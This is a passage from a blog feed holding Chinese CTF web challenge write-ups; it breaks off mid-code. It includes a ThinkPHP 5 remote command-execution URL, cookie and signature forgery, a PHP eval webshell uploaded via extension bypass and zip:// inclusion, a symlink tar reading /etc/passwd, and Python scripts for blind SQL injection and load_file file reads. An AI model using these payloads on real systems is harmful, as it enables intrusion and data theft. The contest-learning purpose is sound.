rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaN1gI.png" alt="FaN1gI.png"></a></p><p>重点关注这段代码</p><p><a href="https://imgchr.com/i/FaN3vt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaN3vt.md.png" alt="FaN3vt.md.png"></a></p><p>这里可以看出单单对商品方做了校验(自检验)，那购买者呢？不存在对其的任何校验，也就是没有做好双向的校验，这也说明我们可以从伪造购买者的方面去入手，让别人付钱23333</p><p>根据它里面的代码去构造signature就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE = <span class="string">'zhinianyuxin\n'</span></span><br><span class="line">form = &#123;</span><br><span class="line"><span class="string">'order_id'</span>: <span class="string">'119'</span>,</span><br><span class="line"><span class="string">'buyer_id'</span>: <span class="string">'16'</span>,  </span><br><span class="line"><span class="string">'good_id'</span>: <span class="string">'38'</span>,   </span><br><span class="line"><span class="string">'buyer_point'</span>: <span class="string">'200'</span>,</span><br><span class="line"><span class="string">'good_price'</span>: <span class="string">'50'</span>,</span><br><span class="line"><span class="string">'order_create_time'</span>: <span class="string">'1544796662.686132'</span></span><br><span class="line">&#125;</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form])</span><br><span class="line">str2sign3= str2sign.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">sign = md5(str2sign3).hexdigest()</span><br><span class="line">print(sign)</span><br></pre></td></tr></table></figure><p>发包构造一下得到flag,注意红色的地方也要做相应的修改，发包得到flag</p><p><a href="https://imgchr.com/i/FaNoKx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNoKx.png" alt="FaNoKx.png"></a></p><p><a href="https://imgchr.com/i/FaNjGd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNjGd.png" alt="FaNjGd.png"></a></p><h3 id="tp5"><a href="#tp5" class="headerlink" title="tp5"></a>tp5</h3><p>这个题目就是最近几天刚爆出来的tp5远程getshell的漏洞，直接上网搜payload，参考了这篇文章:<a href="https://mp.weixin.qq.com/s/NQAZPz8uT8eNFyeMT4l8Ig" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/NQAZPz8uT8eNFyeMT4l8Ig</a></p><p>我用的是下面的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><p>最后获取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/FaBebt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaBebt.png" alt="FaBebt.png"></a></p><h3 id="secret-system"><a href="#secret-system" class="headerlink" title="secret-system"></a>secret-system</h3><p>一进去之后会发现login功能没反应，而upload页面也需要管理员权限，肯定是要伪造自己是管理员的身份然后去挖掘文件上传的漏洞，查看源代码无果后顺手看看<code>robots.txt</code>,发现里面有登录的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: index.php?r=site/loginuser_1</span><br></pre></td></tr></table></figure><p>然后就可以进去登陆的页面，再次查看源代码发现作者的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">*** author: cib_zhinianyuxin.com</span><br><span class="line">*** code: github.com</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>顺手去查一下,发现可以用<code>test/cib_sec</code>登录但不是<code>admin</code>，而且泄露的代码里面说明了可以伪造cookie，cookie名称是Cib_security，是一段经过序列化的东西，到时候就可以伪造了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">##README.md</span><br><span class="line"></span><br><span class="line">    *** author: cib_zhinianyuxin.com</span><br><span class="line"></span><br><span class="line">It&apos;s just a system which is not completed , there are some tips:</span><br><span class="line"></span><br><span class="line">    you can use test/cib_sec to login ,but you are not admin!</span><br><span class="line">    only admin can upload file ,but whichone can not bypass my rules.</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">$sign = array(</span><br><span class="line">                    &apos;id&apos;=&gt;$model-&gt;id,</span><br><span class="line">                    &apos;name&apos;=&gt;$model-&gt;username,</span><br><span class="line">                    &apos;sign&apos;=&gt;md5($model-&gt;id.$model-&gt;username),</span><br><span class="line">                );</span><br><span class="line">$_COOKIE[&apos;Cib_security&apos;] = serialize($sign);</span><br><span class="line">**/</span><br></pre></td></tr></table></figure><p>以test身份登录后把cookie拿出来然后解码</p><p><a href="https://imgchr.com/i/FadGK1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FadGK1.md.png" alt="FadGK1.md.png"></a></p><p>然后把里面的MD5解一下发现是<code>2test</code>,那我们就构造一个<code>1admin</code>，构造如下的序列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3&#123;s:2:&quot;id&quot;;i:1;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;sign&quot;;s:32:&quot;6c5de1b510e8bdd0bc40eff99dcd03f8&quot;;&#125;</span><br></pre></td></tr></table></figure><p>再次经过URL编码然后保存一下cookie就可以以admin身份登录，接上来就是文件上传的部分了，这里的文件上传就是个很简单的后缀名绕过，我试了贼久，这个后缀名有点偏，用的<code>pht</code>,然后发包上传一句话木马，菜刀链接，成功获取flag</p><p><a href="https://imgchr.com/i/FawmQA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FawmQA.png" alt="FawmQA.png"></a></p><h3 id="shell"><a href="#shell" class="headerlink" title="shell?"></a>shell?</h3><p>这个题目确实拓宽了新思路，做了好久才做出来由于特殊原因呢，就不发详细writeup了。。。。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这一次把web给ak了，真是舒服呐23333，截个图留念一下</p><p><img src="https://s1.ax1x.com/2018/12/16/Fd5Lpd.png" alt="Fd5Lpd.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;ez-upload&quot;&gt;&lt;a href=&quot;#ez-upload&quot; class=&quot;headerlink&quot; title=&quot;ez-upload&quot;&gt;&lt;/a&gt;ez-upload&lt;/h3&gt;&lt;p&gt;这个题目作为Web题的第一个题难度刚好，很基础的漏洞点，就考了个文件上传，上来直接用phtml就可以绕过，但是给出来的hint是.htaccess,可能是我非预
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>安恒11月赛Web题目复现</title>
    <link href="0verwatch.top/anheng-11month.html"/>
    <id>0verwatch.top/anheng-11month.html</id>
    <published>2018-11-30T08:37:25.000Z</published>
    <updated>2018-11-30T08:43:36.319Z</updated>
    
    <content type="html"><![CDATA[<p>考完网络安全跟算法就赶紧来复现一下题目，又学到了一波知识了<a id="more"></a>23333，这次题目的质量贼好</p><h3 id="手速要快"><a href="#手速要快" class="headerlink" title="手速要快"></a>手速要快</h3><p>上一个月的原题，不多说，直接在http头里面找到对应的password登陆以后直接就是关于页面上传的功能，这里的上传是服务器端的问题<br>直接上传一个非<code>php</code>结尾的文件即可解析<br><a href="https://imgchr.com/i/FmMnPS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmMnPS.md.png" alt="FmMnPS.md.png"></a><br>然后可以直接输入相关命令获取flag不多说<br><img src="https://s1.ax1x.com/2018/11/30/FmMMvj.png" alt="FmMMvj.png"></p><p><a href="https://imgchr.com/i/FmM1rn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmM1rn.md.png" alt="FmM1rn.md.png"></a></p><h3 id="好黑的黑名单"><a href="#好黑的黑名单" class="headerlink" title="好黑的黑名单"></a>好黑的黑名单</h3><p>这个题目质量很好，至少我以前都没见过这种盲注，里面利用了between的几个特性，又学到了2333<br>右键查看源代码就会发现很明显的<code>id</code>参数，这里的思路就是<code>SQL注入</code><br><img src="https://s1.ax1x.com/2018/11/30/FmM3bq.png" alt="FmM3bq.png"><br>尝试对其进行注入，发现其明显是存在过滤的，一旦遇到关键字就会返回<code>这么坏？想让我下面给你吃吗？XD</code>的字样<br>如果查询不到的话就会返回<code>想让我下面给你吃？</code><br>fuzz一下大概发现过滤的东西有<code>空格，*，union，单引号</code>等等，所以我们就不可以用内联的注入，这里空格我们可以用<code>%0a</code>去绕过，测试一下<br><a href="https://imgchr.com/i/FmQ9oV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQ9oV.md.png" alt="FmQ9oV.md.png"></a><br>下面就是这次盲注的重点知识利用<code>between and</code><br><img src="https://s1.ax1x.com/2018/11/30/FmQFWF.png" alt="FmQFWF.png"><br>上面两个执行语句就解释了为什么可以这样做，当select的值在between之间就会返回1，而且前面选择出来的词语会按照顺序匹配，第一个匹配正确的话就会匹配第二个<br><img src="https://s1.ax1x.com/2018/11/30/FmQkz4.png" alt="FmQkz4.png"><br>而且还可以固定好最后一位，然后前面一步步去字母给找出<br><img src="https://s1.ax1x.com/2018/11/30/FmQVy9.png" alt="FmQVy9.png"><br>但是把数据库跑出来以后后面继续加上空格还是会显示1，这在写脚本的时候得注意一下，还有几点得注意下，单引号过滤掉可以使用16进制，另外<code>information_schema.tables</code>被过滤可以使用<code>information_schema%0a.tables</code>这样去绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">burl = <span class="string">'http://101.71.29.5:10008/show.php?id=-1'</span></span><br><span class="line"></span><br><span class="line">flag  = <span class="number">0</span></span><br><span class="line">ans  = <span class="string">''</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line"><span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">127</span>,<span class="number">32</span>,<span class="number">-1</span>):</span><br><span class="line"><span class="keyword">if</span> j == <span class="number">33</span>:</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="comment">#payload = '%0aor%0a(select%0adatabase()%0abetween%0a0x'+result+hex(j)[2:4]+'%0aand%0a0x7a)' #web</span></span><br><span class="line"><span class="comment">#payload  = '%0aor%0a(select%0a(select%0agroup_concat(table_name)%0afrom%0ainformation_schema%0a.tables%0awhere%0atable_schema%0abetween%0a0x776562%0aand%0a0x776562)%0abetween%0a0x'+result+hex(j)[2:4]+'%0aand%0a0x7a)'  #admin,flaggg,menu</span></span><br><span class="line"><span class="comment">#payload = '%0aor%0a(select%0a(select%0agroup_concat(column_name)%0afrom%0ainformation_schema%0a.columns%0awhere%0atable_name%0abetween%0a0x666c61676767%0aand%0a0x666c61676767)%0abetween%0a0x'+result+hex(j)[2:4]+'%0aand%0a0x7a)'  #id,f1agg</span></span><br><span class="line">payload = <span class="string">'%0aor%0a(select%0a(select%0af1agg%0afrom%0aflaggg)%0abetween%0a0x'</span>+result+hex(j)[<span class="number">2</span>:<span class="number">4</span>]+<span class="string">'%0aand%0a0x7a)'</span></span><br><span class="line">url = burl+ payload</span><br><span class="line">con  = requests.get(url)</span><br><span class="line"><span class="comment">#print(con.text)</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">u"郑州"</span> <span class="keyword">in</span> con.text:</span><br><span class="line">ans = ans + chr(j)</span><br><span class="line">print(result)</span><br><span class="line">result = result + hex(j)[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure><p>愉快地拿到flag<br><a href="https://imgchr.com/i/FmQndx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQndx.md.png" alt="FmQndx.md.png"></a></p><h3 id="interesting-web"><a href="#interesting-web" class="headerlink" title="interesting web"></a>interesting web</h3><p>这个题目上来就发现有注册，登录，找回密码的功能，通常我们需要注册看一下<br>登陆之后发现上传页面，但是根据页面一开始提示说明管理员才可以上传<code>tar</code>包，这里就容易想到软连接，但是首先我们得以<code>admin</code>身份登录，这时候根据http可以发现这应该是<code>flask</code>框架写的web<br><img src="https://s1.ax1x.com/2018/11/30/FmQlWD.png" alt="FmQlWD.png"></p><p>这里有一个点就是<code>flask</code>框架的<code>session</code>可以在浏览器端查看，并且可以读取里面的<code>token</code>值，<br><a href="https://imgchr.com/i/FmQGyd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQGyd.md.png" alt="FmQGyd.md.png"></a><br>这东西可以利用在找回密码的功能上面<br><a href="https://imgchr.com/i/FmQJOA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQJOA.md.png" alt="FmQJOA.md.png"></a><br>这里面的token值我们可以用来直接修改admin的密码，这东西恰好就是修改密码需要的东西<br>然后再以admin身份登录，上一个软连接的tar包，先构造一下tar包<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/passwd 2222222.jpg</span><br><span class="line">tar cvfp 233.tar 2222222.jpg</span><br></pre></td></tr></table></figure></p><p>上传后tar包解压，然后curl一下该图片地址获取flag<br><a href="https://imgchr.com/i/FmQDSg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQDSg.md.png" alt="FmQDSg.md.png"></a></p><p><code>flag{5be43c58a33a867cb11975587f8edf33}</code></p><h3 id="image-up"><a href="#image-up" class="headerlink" title="image up"></a>image up</h3><p>一上来就是个登录页面其实这个登录页面没有用，你随便输如都可以登录到后台上传页面<br><a href="https://imgchr.com/i/FmQgwq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQgwq.md.png" alt="FmQgwq.md.png"></a><br>可以看到url，可能存在文件包含，尝试一下读取文件，可以读到一下index以及upload页面<br><code>http://101.71.29.5:10007/index.php?page=php://filter/read=convert.base64-encode/resource=index</code><br><code>http://101.71.29.5:10007/index.php?page=php://filter/read=convert.base64-encode/resource=upload</code></p><p> index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!stristr($_GET[<span class="string">'page'</span>], <span class="string">".."</span>)) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'page'</span>].<span class="string">".php"</span>;</span><br><span class="line">    <span class="keyword">include</span>($page);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">"Location: index.php?page=login"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  header(<span class="string">"Location: index.php?page=login"</span>);</span><br><span class="line">这里的代码验证不需要任何检验就可以登录</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span> php $error = <span class="string">""</span>;</span><br><span class="line">$exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"gif"</span>, <span class="string">"jpeg"</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_FILES[<span class="string">"image"</span>])) &#123;</span><br><span class="line">  $temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"image"</span>][<span class="string">"name"</span>]);</span><br><span class="line">  $extension = end($temp);</span><br><span class="line">  <span class="keyword">if</span> ((@$_upfileS[<span class="string">"image"</span>][<span class="string">"size"</span>] &lt; <span class="number">102400</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array($extension, $exts)) &#123;</span><br><span class="line">      $path = <span class="string">"uploads/"</span>.md5($temp[<span class="number">0</span>].time()).<span class="string">"."</span>.$extension;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"image"</span>][<span class="string">"tmp_name"</span>], $path);</span><br><span class="line">      $error = <span class="string">"????????????!"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $error = <span class="string">"???????????????"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $error = <span class="string">"??????????????????????????????"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>从文件上传的而这段代码也很容易看，就是文件名加上时间戳然后再MD5拼接成新的文件名，这两个东西我们可以进行预测<br>自己本地新建一个<code>over.php</code><br>里面的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">phpinfo();</span><br><span class="line">  @<span class="keyword">eval</span>($_POST[<span class="string">'_'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>把该文件压缩，然后改后缀名为.jpg的图片文件，接着就该预测路径名字并使用伪协议<br>这里很坑，有个时区的问题加上<code>8*3600</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://101.71.29.5:10007/"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(str)</span>:</span></span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(str)</span><br><span class="line"><span class="keyword">return</span> m.hexdigest()</span><br><span class="line">files = &#123;</span><br><span class="line"><span class="string">"image"</span>:(<span class="string">"over123.jpg"</span>,open(<span class="string">"over.jpg"</span>,<span class="string">"rb"</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#print open("over.jpg","rb")</span></span><br><span class="line">t = int(time.time()+<span class="number">8</span>*<span class="number">3600</span>)</span><br><span class="line">requests.post(url=url+<span class="string">"upload.php"</span>,files=files)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(t<span class="number">-100</span>,t+<span class="number">150</span>):</span><br><span class="line">path = <span class="string">"uploads/"</span>+md5(<span class="string">"over123"</span>+str(i))+<span class="string">".jpg"</span></span><br><span class="line"><span class="comment">#print 'Waiting'</span></span><br><span class="line">status = requests.get(url=url+path).status_code</span><br><span class="line"><span class="keyword">if</span> status ==<span class="number">200</span>:</span><br><span class="line"><span class="keyword">print</span> path</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>爆出路径<br><code>uploads/cf0dd54323ba204f8151905e912964c1.jpg</code><br>最后的关键点是利用伪协议进行命令执行，这里同样的也可以使用phar，关键是把%23改为/就好，注意这里不需要对文件加上相关的后缀<br><code>http://101.71.29.5:10007/index.php?page=zip://./uploads/cf0dd54323ba204f8151905e912964c1.jpg%23over</code><br><a href="https://imgchr.com/i/FmQfYT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQfYT.md.png" alt="FmQfYT.md.png"></a><br>得到flag<br><a href="https://imgchr.com/i/FmQo6J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQo6J.md.png" alt="FmQo6J.md.png"></a><br><code>flag{3809f2ce999b4d99c8051e285505a014}</code></p><h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h3><p>这一题质量很好哇，考了SQL注入读取文件，反序列化，命令行执行的绕过</p><p>先看看注入点，这里注册进去之后在用户信息里面明显看到id参数，这里就可以测试一下，这里通过这次两个题目的注入，可以学到到先要根据数据库返回的信息来做出自己的判断，比如查到会回显什么，查不到又会回显什么，语法错误又会回显什么等等，根据这个东西去做出判断应该作何注入</p><p>这里还有一个点也是学到的就是怎么测试他是用替换还是删除来过滤黑名单，我们只需要再注册的地方放输入类似<code>select</code>之类的关键字就会在用户页面发现被替换成<code>@</code>。下一个题目也是类似的道理。</p><p>这一个题可以有两种构造布尔盲注的思路一种是利用<code>limit</code>，另一种是用加减号等运算符号，这里同样是很好的学习点</p><p>可以来构造SQL读文件的语句了<br>这里这样构造<code>http://101.71.29.5:10015/user/user.php?id=1-1</code>根据这里的减1还是减0去判断是否存在我们猜测的文件<br>首先得了解一下当数据库里面<code>secure_file_priv</code>的值是空的话，就可以读取任意文件<br><img src="https://s1.ax1x.com/2018/11/30/FmlRud.png" alt="FmlRud.png"><br>开始构造语句<br><code>http://101.71.29.5:10015/user/user.php?id=1-(load_file(&#39;/var/www/html/index.php&#39;) like &#39;&lt;%&#39;)</code><br>但是不能出现引号16进制转一下<br><code>http://101.71.29.5:10015/user/user.php?id=1-(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870) like 0x3c25)</code><br>又因为读文件的时候会出现换行等问题而不能全读取因此将loadfile的内容16进制转一下<br><code>http://101.71.29.5:10015/user/user.php?id=1-(hex(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870)) like 0x3c25)</code></p><p>模仿着写一个脚本，这里有点不明白的是为什么这里的脚本传进去的字符已经是16进制字符为毛还得hex一次？除了那个<code>%</code>确实需要16进制转一下，但是我试了一下不hex的话不能跑出来，有大佬告诉一下我原因吗23333.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">hex_s = <span class="keyword">lambda</span> s:binascii.hexlify(s)</span><br><span class="line">s = <span class="string">'ABCDEF'</span> + string.digits</span><br><span class="line">filename = <span class="string">'/var/www/html/index.php'</span></span><br><span class="line"><span class="comment">#filename = '/var/www/html/config/waf.php'</span></span><br><span class="line">ans = <span class="string">''</span></span><br><span class="line">url = <span class="string">'http://101.71.29.5:10015/user/user.php?id=2-if(hex(load_file(0x%s)) like 0x%s,1,2)'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">10000</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">payload = ans + j + <span class="string">'%'</span></span><br><span class="line">_url = url % (hex_s(filename),hex_s(payload))</span><br><span class="line"><span class="comment">#print _url</span></span><br><span class="line">con = requests.get(_url, cookies=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"vn7dm5pk3dqvicrkg43om69hi0"</span>&#125;)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'2018'</span> <span class="keyword">in</span> con.content:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'...'</span>+payload</span><br><span class="line">ans = ans + j</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p>然后得到index.php的关键代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config/sys_config.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'header.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'CONFIG'</span>]))&#123;</span><br><span class="line">    $config = $_COOKIE[<span class="string">'CONFIG'</span>];</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'config/config.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>再去读取config.php里面的内容<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config = 